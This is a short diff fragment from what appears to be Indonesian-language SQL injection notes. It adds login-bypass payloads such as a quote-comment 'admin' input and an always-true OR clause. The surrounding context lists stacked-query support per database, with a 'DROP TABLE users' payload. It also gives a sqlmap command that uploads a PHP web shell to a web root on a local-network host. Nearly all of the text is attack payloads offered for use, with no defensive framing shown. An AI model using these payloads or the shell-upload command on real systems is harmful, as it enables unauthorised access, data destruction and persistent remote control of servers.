@@ -71,6 +71,10 @@ PgSQL ✓ '; DROP TABLE users-- -
 Oracle ~ terbatas — blok PL/SQL anonim
 MySQL ✗ driver PHP (mysqli/PDO) menolak
 
+
+admin'-- -
+' OR '1'='1'-- -
+
 sqlmap.py -u "http://192.168.1.69:6969/logs/search?q='" --file-write="C:\Users\MYUSER-FU\Downloads\shell.php" --file-dest="/var/www/html/shell.php"
 
 
